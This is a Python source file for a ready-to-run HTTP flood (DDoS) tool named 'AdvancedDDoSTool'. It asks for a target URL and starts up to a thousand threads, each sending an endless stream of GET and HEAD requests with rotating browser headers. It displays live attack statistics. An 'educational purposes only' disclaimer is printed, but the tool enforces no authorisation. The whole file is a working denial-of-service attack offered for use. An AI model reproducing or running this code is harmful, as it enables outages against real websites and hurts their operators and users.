#!/usr/bin/env python3
import os
import sys
import time
import signal
import threading
import asyncio
import aiohttp
import random
import socket
import ssl
from datetime import datetime
from colorama import init, Fore, Back, Style

# Initialize colorama
init(autoreset=True)

# Constants
VERSION = "5.0"
AUTHOR = "NeuroHexa Pro"
MAX_THREADS = 1000
DEFAULT_TIMEOUT = 15
MAX_DURATION = 3600  # 1 hour max by default

# Enhanced User Agents and headers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
]

class AdvancedDDoSTool:
    def __init__(self):
        self.running = False
        self.threads = []
        self.attack_stats = {
            'start_time': None,
            'requests_sent': 0,
            'successful_responses': 0,
            'failed_requests': 0,
            'attack_duration': None,
            'target': None
        }
        signal.signal(signal.SIGINT, self.signal_handler)

    def clear_screen(self):
        """Clear terminal screen cross-platform"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def signal_handler(self, sig, frame):
        """Handle CTRL+C interrupt"""
        self.stop_attack()
        print(Fore.RED + "\n[!] Attack stopped by user")
        self.show_summary()
        sys.exit(0)

    def print_banner(self):
        """Print the enhanced tool banner"""
        self.clear_screen()
        print(Fore.MAGENTA + Style.BRIGHT + r"""
   ███╗   ██╗███████╗██╗   ██╗██████╗  ██████╗ ██╗  ██╗███████╗██╗  ██╗
   ████╗  ██║██╔════╝╚██╗ ██╔╝██╔══██╗██╔═══██╗╚██╗██╔╝██╔════╝╚██╗██╔╝
   ██╔██╗ ██║█████╗   ╚████╔╝ ██████╔╝██║   ██║ ╚███╔╝ █████╗   ╚███╔╝ 
   ██║╚██╗██║██╔══╝    ╚██╔╝  ██╔══██╗██║   ██║ ██╔██╗ ██╔══╝   ██╔██╗ 
   ██║ ╚████║███████╗   ██║   ██║  ██║╚██████╔╝██╔╝ ██╗███████╗██╔╝ ██╗
   ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
        """)
        print(Fore.CYAN + f"Version: {VERSION} | {AUTHOR}")
        print(Fore.YELLOW + "="*60 + Style.RESET_ALL)

    def print_disclaimer(self):
        """Print enhanced legal disclaimer"""
        print(Fore.RED + Style.BRIGHT + "\n[!] LEGAL DISCLAIMER:")
        print(Fore.YELLOW + """
THIS TOOL IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY.
UNAUTHORIZED USE AGAINST SYSTEMS IS STRICTLY PROHIBITED.
MISUSE MAY RESULT IN SEVERE LEGAL CONSEQUENCES.

BY USING THIS SOFTWARE, YOU AGREE THAT:
1. You have proper authorization for testing
2. You accept full responsibility for your actions
3. The developers are not liable for any misuse
        """)
        
        consent = input(Fore.GREEN + "\n[?] Do you understand and accept? (y/N): ").lower()
        if consent != 'y':
            print(Fore.RED + "[!] Aborting...")
            sys.exit(0)

    def validate_target(self, target):
        """Validate and normalize the target URL/IP"""
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        try:
            # Extract domain/ip and port
            if '://' in target:
                domain = target.split('://')[1].split('/')[0]
            else:
                domain = target.split('/')[0]
            
            if ':' in domain:
                host, port = domain.split(':')
                port = int(port)
            else:
                host = domain
                port = 80 if target.startswith('http://') else 443
            
            # Try to resolve host
            socket.gethostbyname(host)
            return target
        except Exception as e:
            print(Fore.RED + f"[!] Invalid target: {str(e)}")
            sys.exit(1)

    def get_random_headers(self):
        """Generate random headers for each request"""
        return {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': random.choice(ACCEPT_HEADERS),
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.google.com/'
        }

    async def send_request(self, session, target):
        """Send HTTP request with enhanced features"""
        try:
            headers = self.get_random_headers()
            
            # Randomize between GET and HEAD requests
            method = random.choice(['GET', 'HEAD'])
            
            async with session.request(
                method,
                target,
                headers=headers,
                timeout=DEFAULT_TIMEOUT,
                ssl=False,
                allow_redirects=True
            ) as response:
                with threading.Lock():
                    self.attack_stats['requests_sent'] += 1
                    if response.status == 200:
                        self.attack_stats['successful_responses'] += 1
                    else:
                        self.attack_stats['failed_requests'] += 1
                
                self.update_display()
        except Exception as e:
            with threading.Lock():
                self.attack_stats['failed_requests'] += 1
            self.update_display()

    def update_display(self):
        """Update the status display"""
        elapsed = datetime.now() - self.attack_stats['start_time']
        reqs = self.attack_stats['requests_sent']
        success = self.attack_stats['successful_responses']
        failed = self.attack_stats['failed_requests']
        
        sys.stdout.write(
            f"\r[+] Target: {self.attack_stats['target']} | "
            f"Requests: {reqs:,} | "
            f"Success: {success:,} | "
            f"Failed: {failed:,} | "
            f"Duration: {self.format_duration(elapsed.total_seconds())}"
        )
        sys.stdout.flush()

    async def attack_worker(self, target):
        """Worker for sending concurrent requests"""
        connector = aiohttp.TCPConnector(
            force_close=True,
            enable_cleanup_closed=True,
            limit=0,
            ttl_dns_cache=300
        )
        
        timeout = aiohttp.ClientTimeout(total=DEFAULT_TIMEOUT)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            trust_env=True
        ) as session:
            while self.running:
                await self.send_request(session, target)

    def monitor_attack(self):
        """Display detailed attack statistics"""
        while self.running:
            self.clear_screen()
            self.print_banner()
            
            elapsed = datetime.now() - self.attack_stats['start_time']
            reqs = self.attack_stats['requests_sent']
            success = self.attack_stats['successful_responses']
            failed = self.attack_stats['failed_requests']
            
            print(Fore.GREEN + "\n[+] Attack Status:")
            print(Fore.YELLOW + "-"*80)
            print(Fore.CYAN + f"Target: {self.attack_stats['target']}")
            print(Fore.CYAN + f"Elapsed Time: {self.format_duration(elapsed.total_seconds())}")
            print(Fore.CYAN + f"Total Requests: {reqs:,}")
            print(Fore.CYAN + f"Successful Responses: {success:,} ({success/reqs*100:.2f}%)" if reqs > 0 else "0")
            print(Fore.CYAN + f"Failed Requests: {failed:,} ({failed/reqs*100:.2f}%)" if reqs > 0 else "0")
            
            if elapsed.total_seconds() > 0:
                rate = reqs / elapsed.total_seconds()
                print(Fore.CYAN + f"Request Rate: {rate:,.2f} req/sec")
            
            print(Fore.YELLOW + "-"*80)
            print(Fore.RED + "\nPress CTRL+C to stop the attack")
            
            time.sleep(1)

    def format_duration(self, seconds):
        """Format duration as HH:MM:SS"""
        m, s = divmod(seconds, 60)
        h, m = divmod(m, 60)
        return f"{int(h):02d}:{int(m):02d}:{int(s):02d}"

    def start_attack(self, target, threads, duration=None):
        """Start the DDoS attack with enhanced features"""
        self.running = True
        self.attack_stats = {
            'start_time': datetime.now(),
            'requests_sent': 0,
            'successful_responses': 0,
            'failed_requests': 0,
            'attack_duration': None,
            'target': target
        }
        
        print(Fore.YELLOW + f"\n[*] Starting attack with {threads} threads...")
        if duration:
            print(Fore.YELLOW + f"[*] Maximum duration set to {duration} seconds")
        
        # Create event loop for each thread
        def worker():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self.attack_worker(target))
        
        # Start attack threads
        for i in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)
        
        # Start monitoring thread
        monitor = threading.Thread(target=self.monitor_attack, daemon=True)
        monitor.start()
        
        # Duration timer if specified
        if duration:
            def duration_timer():
                time.sleep(duration)
                self.stop_attack()
            threading.Thread(target=duration_timer, daemon=True).start()
        
        # Wait for threads
        for t in self.threads:
            t.join()
        
        monitor.join()

    def stop_attack(self):
        """Stop all attack threads"""
        if not self.running:
            return
            
        self.running = False
        if self.attack_stats['start_time']:
            self.attack_stats['attack_duration'] = datetime.now() - self.attack_stats['start_time']
        
        for t in self.threads:
            t.join(timeout=1)
        
        self.threads = []

    def get_integer_input(self, prompt, default=None, min_val=None, max_val=None):
        """Get validated integer input from user"""
        while True:
            try:
                value = input(Fore.GREEN + prompt)
                if default and not value:
                    return default
                num = int(value)
                
                if min_val is not None and num < min_val:
                    print(Fore.RED + f"[!] Value must be ≥ {min_val}")
                    continue
                if max_val is not None and num > max_val:
                    print(Fore.RED + f"[!] Value must be ≤ {max_val}")
                    continue
                
                return num
            except ValueError:
                print(Fore.RED + "[!] Please enter a valid number")

    def show_summary(self):
        """Display detailed attack summary"""
        if not self.attack_stats.get('start_time'):
            return
            
        duration = self.attack_stats.get('attack_duration')
        if not duration:
            duration = datetime.now() - self.attack_stats['start_time']
        
        reqs = self.attack_stats.get('requests_sent', 0)
        success = self.attack_stats.get('successful_responses', 0)
        failed = self.attack_stats.get('failed_requests', 0)
        
        self.clear_screen()
        self.print_banner()
        
        print(Fore.GREEN + "\n[+] Attack Summary:")
        print(Fore.YELLOW + "="*80)
        print(Fore.CYAN + f"Target: {self.attack_stats['target']}")
        print(Fore.CYAN + f"Duration: {self.format_duration(duration.total_seconds())}")
        print(Fore.CYAN + f"Total Requests: {reqs:,}")
        print(Fore.CYAN + f"Successful Responses: {success:,} ({success/reqs*100:.2f}%)" if reqs > 0 else "0")
        print(Fore.CYAN + f"Failed Requests: {failed:,} ({failed/reqs*100:.2f}%)" if reqs > 0 else "0")
        
        if duration.total_seconds() > 0:
            rate = reqs / duration.total_seconds()
            print(Fore.CYAN + f"Average Rate: {rate:,.2f} req/sec")
        
        print(Fore.YELLOW + "="*80)
        print(Fore.GREEN + "[+] Attack completed" + Style.RESET_ALL)

    def run(self):
        """Main execution flow"""
        self.print_banner()
        self.print_disclaimer()
        
        # Get target
        target = input(Fore.GREEN + "\n[?] Enter target URL/IP: ").strip()
        target = self.validate_target(target)
        
        # Get threads count
        threads = self.get_integer_input(
            f"[?] Number of threads (1-{MAX_THREADS}, default: 100): ",
            default=100,
            min_val=1,
            max_val=MAX_THREADS
        )
        
        # Get duration (optional)
        duration = None
        use_duration = input(Fore.GREEN + "[?] Set time limit? (y/N): ").lower()
        if use_duration == 'y':
            duration = self.get_integer_input(
                "[?] Duration in seconds (1-3600): ",
                min_val=1,
                max_val=MAX_DURATION
            )
        
        # Final confirmation
        print(Fore.RED + Style.BRIGHT + f"\n[!] WARNING: About to attack {target}")
        print(Fore.RED + f"    Threads: {threads}")
        if duration:
            print(Fore.RED + f"    Duration: {duration} seconds")
        confirm = input(Fore.YELLOW + "[?] Confirm attack? (y/N): ").lower()
        if confirm != 'y':
            print(Fore.YELLOW + "[!] Attack cancelled")
            return
        
        # Countdown
        print(Fore.RED + "\n[!] Starting attack in 5 seconds...")
        for i in range(5, 0, -1):
            print(Fore.YELLOW + f"[*] {i}...")
            time.sleep(1)
        
        try:
            self.start_attack(target, threads, duration)
        except Exception as e:
            print(Fore.RED + f"[!] Attack failed: {str(e)}")
        finally:
            self.stop_attack()
            self.show_summary()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print(Fore.RED + "[!] Warning: Running without root privileges may limit performance")
    
    tool = AdvancedDDoSTool()
    tool.run()